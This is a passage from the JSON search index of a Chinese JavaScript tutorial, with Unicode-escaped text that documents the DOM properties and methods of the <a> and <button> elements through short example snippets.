\u76f8\u5173\u5c5e\u6027\uff0c\u53ef\u4ee5\u7528\u6765\u64cd\u4f5c\u94fe\u63a5\u5730\u5740\u3002\u8fd9\u4e9b\u5c5e\u6027\u7684\u542b\u4e49\uff0c\u53ef\u4ee5\u53c2\u89c1 Location \u5bf9\u8c61\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 hash\uff1a\u7247\u6bb5\u8bc6\u522b\u7b26\uff08\u4ee5 # \u5f00\u5934\uff09 host\uff1a\u4e3b\u673a\u548c\u7aef\u53e3\uff08\u9ed8\u8ba4\u7aef\u53e380\u548c443\u4f1a\u7701\u7565\uff09 hostname\uff1a\u4e3b\u673a\u540d href\uff1a\u5b8c\u6574\u7684 URL origin\uff1a\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3 password\uff1a\u4e3b\u673a\u540d\u524d\u7684\u5bc6\u7801 pathname\uff1a\u8def\u5f84\uff08\u4ee5 / \u5f00\u5934\uff09 port\uff1a\u7aef\u53e3 protocol\uff1a\u534f\u8bae\uff08\u5305\u542b\u5c3e\u90e8\u7684\u5192\u53f7 : \uff09 search\uff1a\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u4ee5 ? \u5f00\u5934\uff09 username\uff1a\u4e3b\u673a\u540d\u524d\u7684\u7528\u6237\u540d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"http://user:passwd@example.com:8081/index.html?bar=1#foo\">test</a> var a = document . getElementById ( 'test' ); a . hash // \"#foo\" a . host // \"example.com:8081\" a . hostname // \"example.com\" a . href // \"http://user:passed@example.com:8081/index.html?bar=1#foo\" a . origin // \"http://example.com:8081\" a . password // \"passwd\" a . pathname // \"/index.html\" a . port // \"8081\" a . protocol // \"http:\" a . search // \"?bar=1\" a . username // \"user\" \u9664\u4e86 origin \u5c5e\u6027\u662f\u53ea\u8bfb\u7684\uff0c\u4e0a\u9762\u8fd9\u4e9b\u5c5e\u6027\u90fd\u662f\u53ef\u8bfb\u5199\u7684\u3002","title":"URL \u76f8\u5173\u5c5e\u6027"},{"location":"elements/a/#accesskey","text":"accessKey \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684\u5feb\u6377\u952e\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"http://example.com\">test</a> var a = document . getElementById ( 'test' ); a . accessKey = 'k' ; \u4e0a\u9762\u4ee3\u7801\u8bbe\u7f6e <a> \u5143\u7d20\u7684\u5feb\u6377\u952e\u4e3a k \uff0c\u4ee5\u540e\u53ea\u8981\u6309\u4e0b\u8fd9\u4e2a\u5feb\u6377\u952e\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8df3\u8f6c\u5230 example.com \u3002 \u6ce8\u610f\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u5728\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\uff0c\u5524\u8d77\u5feb\u6377\u952e\u7684\u529f\u80fd\u952e\u7ec4\u5408\u662f \u4e0d\u4e00\u6837 \u7684\u3002\u6bd4\u5982\uff0cChrome \u6d4f\u89c8\u5668\u5728 Linux \u7cfb\u7edf\u4e0b\uff0c\u9700\u8981\u6309\u4e0b Alt + k \uff0c\u624d\u4f1a\u8df3\u8f6c\u5230 example.com \u3002","title":"accessKey \u5c5e\u6027"},{"location":"elements/a/#download","text":"download \u5c5e\u6027\u8868\u793a\u5f53\u524d\u94fe\u63a5\u4e0d\u662f\u7528\u6765\u6d4f\u89c8\uff0c\u800c\u662f\u7528\u6765\u4e0b\u8f7d\u7684\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u4e0b\u8f7d\u5f97\u5230\u7684\u6587\u4ef6\u540d\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"foo.jpg\">\u4e0b\u8f7d</a> var a = document . getElementById ( 'test' ); a . download = 'bar.jpg' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <a> \u5143\u7d20\u662f\u4e00\u4e2a\u56fe\u7247\u94fe\u63a5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u70b9\u51fb\u540e\u56fe\u7247\u4f1a\u5728\u5f53\u524d\u7a97\u53e3\u52a0\u8f7d\u3002\u8bbe\u7f6e\u4e86 download \u5c5e\u6027\u4ee5\u540e\uff0c\u518d\u70b9\u51fb\u8fd9\u4e2a\u94fe\u63a5\uff0c\u5c31\u4f1a\u4e0b\u8f7d\u5bf9\u8bdd\u6846\uff0c\u8be2\u95ee\u7528\u6237\u4fdd\u5b58\u4f4d\u7f6e\uff0c\u800c\u4e14\u4e0b\u8f7d\u7684\u6587\u4ef6\u540d\u4e3a bar.jpg \u3002","title":"download \u5c5e\u6027"},{"location":"elements/a/#hreflang","text":"hreflang \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 hreflang \uff0c\u8868\u793a\u94fe\u63a5\u6307\u5411\u7684\u8d44\u6e90\u7684\u8bed\u8a00\uff0c\u6bd4\u5982 hreflang=\"en\" \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" hreflang=\"en\">test</a> var a = document . getElementById ( 'test' ); a . hreflang // \"en\"","title":"hreflang \u5c5e\u6027"},{"location":"elements/a/#referrerpolicy","text":"referrerPolicy \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 referrerPolicy \uff0c\u6307\u5b9a\u5f53\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u65f6\uff0c\u5982\u4f55\u53d1\u9001 HTTP \u5934\u4fe1\u606f\u7684 referer \u5b57\u6bb5\u3002 HTTP \u5934\u4fe1\u606f\u7684 referer \u5b57\u6bb5\uff0c\u8868\u793a\u5f53\u524d\u8bf7\u6c42\u662f\u4ece\u54ea\u91cc\u6765\u7684\u3002\u5b83\u7684\u683c\u5f0f\u53ef\u4ee5\u7531 <a> \u5143\u7d20\u7684 referrerPolicy \u5c5e\u6027\u6307\u5b9a\uff0c\u5171\u6709\u4e09\u4e2a\u503c\u53ef\u4ee5\u9009\u62e9\u3002 no-referrer \uff1a\u4e0d\u53d1\u9001 referer \u5b57\u6bb5\u3002 origin \uff1a referer \u5b57\u6bb5\u7684\u503c\u662f <a> \u5143\u7d20\u7684 origin \u5c5e\u6027\uff0c\u5373\u534f\u8bae + \u4e3b\u673a\u540d + \u7aef\u53e3\u3002 unsafe-url \uff1a referer \u5b57\u6bb5\u7684\u503c\u662f origin \u5c5e\u6027\u518d\u52a0\u4e0a\u8def\u5f84\uff0c\u4f46\u4e0d\u5305\u542b # \u7247\u6bb5\u3002\u8fd9\u79cd\u683c\u5f0f\u63d0\u4f9b\u7684\u4fe1\u606f\u6700\u8be6\u7ec6\uff0c\u53ef\u80fd\u5b58\u5728\u4fe1\u606f\u6cc4\u6f0f\u7684\u98ce\u9669\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" referrerpolicy=\"no-referrer\">test</a> var a = document . getElementById ( 'test' ); a . referrerPolicy // \"no-referrer\"","title":"referrerPolicy \u5c5e\u6027"},{"location":"elements/a/#rel","text":"rel \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 rel \uff0c\u8868\u793a\u94fe\u63a5\u4e0e\u5f53\u524d\u6587\u6863\u7684\u5173\u7cfb\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" rel=\"license\">license.html</a> var a = document . getElementById ( 'test' ); a . rel // \"license\"","title":"rel \u5c5e\u6027"},{"location":"elements/a/#tabindex","text":"tabIndex \u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u7528\u6765\u8bfb\u5199\u5f53\u524d <a> \u5143\u7d20\u5728\u6587\u6863\u91cc\u9762\u7684 Tab \u952e\u904d\u5386\u987a\u5e8f\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\">test</a> var a = document . getElementById ( 'test' ); a . tabIndex // 0","title":"tabIndex \u5c5e\u6027"},{"location":"elements/a/#target","text":"target \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 target \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\" target=\"_blank\">test</a> var a = document . getElementById ( 'test' ); a . target // \"_blank\"","title":"target \u5c5e\u6027"},{"location":"elements/a/#text","text":"text \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684\u94fe\u63a5\u6587\u672c\uff0c\u7b49\u540c\u4e8e\u5f53\u524d\u8282\u70b9\u7684 textContent \u5c5e\u6027\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" href=\"https://example.com\">test</a> var a = document . getElementById ( 'test' ); a . text // \"test\"","title":"text \u5c5e\u6027"},{"location":"elements/a/#type","text":"type \u5c5e\u6027\u7528\u6765\u8bfb\u5199 <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 type \uff0c\u8868\u793a\u94fe\u63a5\u76ee\u6807\u7684 MIME \u7c7b\u578b\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <a id=\"test\" type=\"video/mp4\" href=\"example.mp4\">video</a> var a = document . getElementById ( 'test' ); a . type // \"video/mp4\"","title":"type \u5c5e\u6027"},{"location":"elements/a/#_3","text":"<a> \u5143\u7d20\u7684\u65b9\u6cd5\u90fd\u662f\u7ee7\u627f\u7684\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u3002 blur() \uff1a\u4ece\u5f53\u524d\u5143\u7d20\u79fb\u9664\u952e\u76d8\u7126\u70b9\uff0c\u8be6\u89c1 HTMLElement \u63a5\u53e3\u7684\u4ecb\u7ecd\u3002 focus() \uff1a\u5f53\u524d\u5143\u7d20\u5f97\u5230\u952e\u76d8\u7126\u70b9\uff0c\u8be6\u89c1 HTMLElement \u63a5\u53e3\u7684\u4ecb\u7ecd\u3002 toString() \uff1a\u8fd4\u56de\u5f53\u524d <a> \u5143\u7d20\u7684 HTML \u5c5e\u6027 href \u3002","title":"\u65b9\u6cd5"},{"location":"elements/button/","text":"\u5143\u7d20 \u00b6 <button> \u5143\u7d20\u7ee7\u627f\u4e86 HTMLButtonElement \u63a5\u53e3\u3002\u5b83\u6709\u4ee5\u4e0b\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 \uff081\uff09HTMLButtonElement.accessKey HTMLButtonElement.accessKey \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u952e\u76d8\u4e0a\u5bf9\u5e94\u7684\u952e\uff0c\u901a\u8fc7 Alt + \u8fd9\u4e2a\u952e \u53ef\u4ee5\u8ba9\u6309\u94ae\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff082\uff09HTMLButtonElement.autofocus HTMLButtonElement.autofocus \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9875\u9762\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\uff0c\u6309\u94ae\u662f\u5426\u4f1a\u81ea\u52a8\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff083\uff09HTMLButtonElement.disabled HTMLButtonElement.disabled \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6309\u94ae\u662f\u5426\u7981\u6b62\u70b9\u51fb\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff084\uff09HTMLButtonElement.form HTMLButtonElement.form \u5c5e\u6027\u662f\u4e00\u4e2a\u8868\u5355\u5143\u7d20\uff0c\u8fd4\u56de\u8be5\u6309\u94ae\u6240\u5728\u7684\u8868\u5355\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002\u5982\u679c\u6309\u94ae\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u8868\u5355\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 \uff085\uff09HTMLButtonElement.formAction HTMLButtonElement.formAction \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u7684 URL\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u6309\u94ae\u5c31\u4f1a\u63d0\u4ea4\u5230\u8be5\u5c5e\u6027\u6307\u5b9a\u7684 URL\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684 URL\u3002 \uff086\uff09HTMLButtonElement.formEnctype HTMLButtonElement.formEnctype \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u7684\u7f16\u7801\u7c7b\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u6309\u94ae\u4f1a\u6309\u7167\u8be5\u5c5e\u6027\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u5f0f\u3002 \u8be5\u5c5e\u6027\u53ef\u4ee5\u53d6\u4ee5\u4e0b\u7684\u503c\u3002 application/x-www-form-urlencoded \uff08\u9ed8\u8ba4\u503c\uff09 multipart/form-data \uff08\u4e0a\u4f20\u6587\u4ef6\u7684\u7f16\u7801\u65b9\u5f0f\uff09 text/plain \uff087\uff09HTMLButtonElement.formMethod HTMLButtonElement.formMethod \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u63d0\u4ea4\u8868\u5355\u7684 HTTP \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u540e\u5c31\u4f1a\u91c7\u7528\u8be5\u5c5e\u6027\u6307\u5b9a\u7684 HTTP \u65b9\u6cd5\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u6cd5\u3002 \uff088\uff09HTMLButtonElement.formNoValidate HTMLButtonElement.formNoValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u70b9\u51fb\u6309\u94ae\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u662f\u5426\u8981\u8df3\u8fc7\u8868\u5355\u6821\u9a8c\u7684\u6b65\u9aa4\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4f1a\u8986\u76d6 <form> \u5143\u7d20\u7684 novalidate \u5c5e\u6027\u3002 \uff089\uff09HTMLButtonElement.formTarget HTMLButtonElement.formTarget \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u4e86\u63d0\u4ea4\u4e86\u8868\u5355\u4ee5\u540e\uff0c\u54ea\u4e2a\u7a97\u53e3\u5c55\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5185\u5bb9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4f1a\u8986\u76d6 <form> \u5143\u7d20\u7684 target \u5c5e\u6027\u3002 \uff0810\uff09HTMLButtonElement.labels HTMLButtonElement.labels \u8fd4\u56de NodeList \u5b9e\u4f8b\uff0c\u8868\u793a\u90a3\u4e9b\u7ed1\u5b9a\u6309\u94ae\u7684 <label> \u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 /* HTML \u4ee3\u7801\u5982\u4e0b <label id=\"label1\" for=\"test\">Label 1</label> <button id=\"test\">Button</button> <label id=\"label2\" for=\"test\">Label 2</label> */ const button = document . getElementById ( 'test' ); for ( var i = 0 ; i < button . labels . length ; i ++ ) { console . log ( button . labels [ i ]. textContent ); } // \"Label 1\" // \"Label 2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a <label> \u5143\u7d20\u7ed1\u5b9a <button> \u5143\u7d20\u3002 button.labels \u8fd4\u56de\u8fd9\u4e24\u4e2a <label> \u5143\u7d20\u3002 \uff0811\uff09HTMLButtonElement.name HTMLButtonElement.name \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u94ae\u5143\u7d20\u7684 name \u5c5e\u6027\u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e name \u5c5e\u6027\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0812\uff09HTMLButtonElement.tabIndex HTMLButtonElement.tabIndex \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u4ee3\u8868\u6309\u94ae\u5143\u7d20\u7684 Tab \u952e\u987a\u5e8f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0813\uff09HTMLButtonElement.type HTMLButtonElement.type \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u94ae\u7684\u884c\u4e3a\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u53ef\u80fd\u53d6\u4ee5\u4e0b\u7684\u503c\u3002 submit \uff1a\u9ed8\u8ba4\u503c\uff0c\u8868\u793a\u63d0\u4ea4\u8868\u5355\u3002 reset \uff1a\u91cd\u7f6e\u8868\u5355\u3002 button \uff1a\u6ca1\u6709\u4efb\u4f55\u9ed8\u8ba4\u884c\u4e3a\u3002 \uff0814\uff09HTMLButtonElement.validationMessage HTMLButtonElement.validationMessage \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\u65f6\u663e\u793a\u7684\u63d0\u793a\u4fe1\u606f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \uff0815\uff09HTMLButtonElement.validity HTMLButtonElement.validity \u5c5e\u6027\u8fd4\u56de\u8be5\u6309\u94ae\u7684\u6821\u9a8c\u72b6\u6001\uff08 ValidityState \uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \uff0816\uff09HTMLButtonElement.value HTMLButtonElement.value \u5c5e\u6027\u8fd4\u56de\u8be5\u6309\u94ae\u7ed1\u5b9a\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0817\uff09HTMLButtonElement.willValidate HTMLButtonElement.willValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6309\u94ae\u63d0\u4ea4\u8868\u5355\u65f6\u662f\u5426\u5c06\u88ab\u6821\u9a8c\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002","title":"button"},{"location":"elements/button/#_1","text":"<button> \u5143\u7d20\u7ee7\u627f\u4e86 HTMLButtonElement \u63a5\u53e3\u3002\u5b83\u6709\u4ee5\u4e0b\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 \uff081\uff09HTMLButtonElement.accessKey HTMLButtonElement.accessKey \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u952e\u76d8\u4e0a\u5bf9\u5e94\u7684\u952e\uff0c\u901a\u8fc7 Alt + \u8fd9\u4e2a\u952e \u53ef\u4ee5\u8ba9\u6309\u94ae\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff082\uff09HTMLButtonElement.autofocus HTMLButtonElement.autofocus \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9875\u9762\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\uff0c\u6309\u94ae\u662f\u5426\u4f1a\u81ea\u52a8\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff083\uff09HTMLButtonElement.disabled HTMLButtonElement.disabled \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6309\u94ae\u662f\u5426\u7981\u6b62\u70b9\u51fb\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff084\uff09HTMLButtonElement.form HTMLButtonElement.form \u5c5e\u6027\u662f\u4e00\u4e2a\u8868\u5355\u5143\u7d20\uff0c\u8fd4\u56de\u8be5\u6309\u94ae\u6240\u5728\u7684\u8868\u5355\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002\u5982\u679c\u6309\u94ae\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u8868\u5355\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 \uff085\uff09HTMLButtonElement.formAction HTMLButtonElement.formAction \u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u7684 URL\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u6309\u94ae\u5c31\u4f1a\u63d0\u4ea4\u5230\u8be5\u5c5e\u6027\u6307\u5b9a\u7684 URL\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684 URL\u3002 \uff086\uff09HTMLButtonElement.formEnctype HTMLButtonElement.formEnctype \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u63d0\u4ea4\u5230\u670d\u52a1\u5668\u7684\u7f16\u7801\u7c7b\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u6309\u94ae\u4f1a\u6309\u7167\u8be5\u5c5e\u6027\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u5f0f\u3002 \u8be5\u5c5e\u6027\u53ef\u4ee5\u53d6\u4ee5\u4e0b\u7684\u503c\u3002 application/x-www-form-urlencoded \uff08\u9ed8\u8ba4\u503c\uff09 multipart/form-data \uff08\u4e0a\u4f20\u6587\u4ef6\u7684\u7f16\u7801\u65b9\u5f0f\uff09 text/plain \uff087\uff09HTMLButtonElement.formMethod HTMLButtonElement.formMethod \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u63d0\u4ea4\u8868\u5355\u7684 HTTP \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u503c\uff0c\u70b9\u51fb\u540e\u5c31\u4f1a\u91c7\u7528\u8be5\u5c5e\u6027\u6307\u5b9a\u7684 HTTP \u65b9\u6cd5\uff0c\u800c\u4e0d\u662f <form> \u5143\u7d20\u6307\u5b9a\u7684\u7f16\u7801\u65b9\u6cd5\u3002 \uff088\uff09HTMLButtonElement.formNoValidate HTMLButtonElement.formNoValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u70b9\u51fb\u6309\u94ae\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u662f\u5426\u8981\u8df3\u8fc7\u8868\u5355\u6821\u9a8c\u7684\u6b65\u9aa4\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4f1a\u8986\u76d6 <form> \u5143\u7d20\u7684 novalidate \u5c5e\u6027\u3002 \uff089\uff09HTMLButtonElement.formTarget HTMLButtonElement.formTarget \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u4e86\u63d0\u4ea4\u4e86\u8868\u5355\u4ee5\u540e\uff0c\u54ea\u4e2a\u7a97\u53e3\u5c55\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5185\u5bb9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4f1a\u8986\u76d6 <form> \u5143\u7d20\u7684 target \u5c5e\u6027\u3002 \uff0810\uff09HTMLButtonElement.labels HTMLButtonElement.labels \u8fd4\u56de NodeList \u5b9e\u4f8b\uff0c\u8868\u793a\u90a3\u4e9b\u7ed1\u5b9a\u6309\u94ae\u7684 <label> \u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 /* HTML \u4ee3\u7801\u5982\u4e0b <label id=\"label1\" for=\"test\">Label 1</label> <button id=\"test\">Button</button> <label id=\"label2\" for=\"test\">Label 2</label> */ const button = document . getElementById ( 'test' ); for ( var i = 0 ; i < button . labels . length ; i ++ ) { console . log ( button . labels [ i ]. textContent ); } // \"Label 1\" // \"Label 2\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e24\u4e2a <label> \u5143\u7d20\u7ed1\u5b9a <button> \u5143\u7d20\u3002 button.labels \u8fd4\u56de\u8fd9\u4e24\u4e2a <label> \u5143\u7d20\u3002 \uff0811\uff09HTMLButtonElement.name HTMLButtonElement.name \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u94ae\u5143\u7d20\u7684 name \u5c5e\u6027\u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e name \u5c5e\u6027\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0812\uff09HTMLButtonElement.tabIndex HTMLButtonElement.tabIndex \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u4ee3\u8868\u6309\u94ae\u5143\u7d20\u7684 Tab \u952e\u987a\u5e8f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0813\uff09HTMLButtonElement.type HTMLButtonElement.type \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u94ae\u7684\u884c\u4e3a\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u53ef\u80fd\u53d6\u4ee5\u4e0b\u7684\u503c\u3002 submit \uff1a\u9ed8\u8ba4\u503c\uff0c\u8868\u793a\u63d0\u4ea4\u8868\u5355\u3002 reset \uff1a\u91cd\u7f6e\u8868\u5355\u3002 button \uff1a\u6ca1\u6709\u4efb\u4f55\u9ed8\u8ba4\u884c\u4e3a\u3002 \uff0814\uff09HTMLButtonElement.validationMessage HTMLButtonElement.validationMessage \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\u65f6\u663e\u793a\u7684\u63d0\u793a\u4fe1\u606f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \uff0815\uff09HTMLButtonElement.validity HTMLButtonElement.validity \u5c5e\u6027\u8fd4\u56de\u8be5\u6309\u94ae\u7684\u6821\u9a8c\u72b6\u6001\uff08 ValidityState \uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \uff0816\uff09HTMLButtonElement.value HTMLButtonElement.value \u5c5e\u6027\u8fd4\u56de\u8be5\u6309\u94ae\u7ed1\u5b9a\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 \uff0817\uff09HTMLButtonElement.willValidate HTMLButtonElement.willValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6309\u94ae\u63d0\u4ea4\u8868\u5355\u65f6\u662f\u5426\u5c06\u88ab\u6821\u9a8c\uff0c\u9ed8\u8ba4\u4e3a false \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002","title":" \u5143\u7d20"},{"location":"elements/form/","text":"\u5143\u7d20 \u00b6 <form> \u5143\u7d20\u4ee3\u8868\u4e86\u8868\u5355\uff0c\u7ee7\u627f\u4e86 HTMLFormElement \u63a5\u53e3\u3002 HTMLFormElement 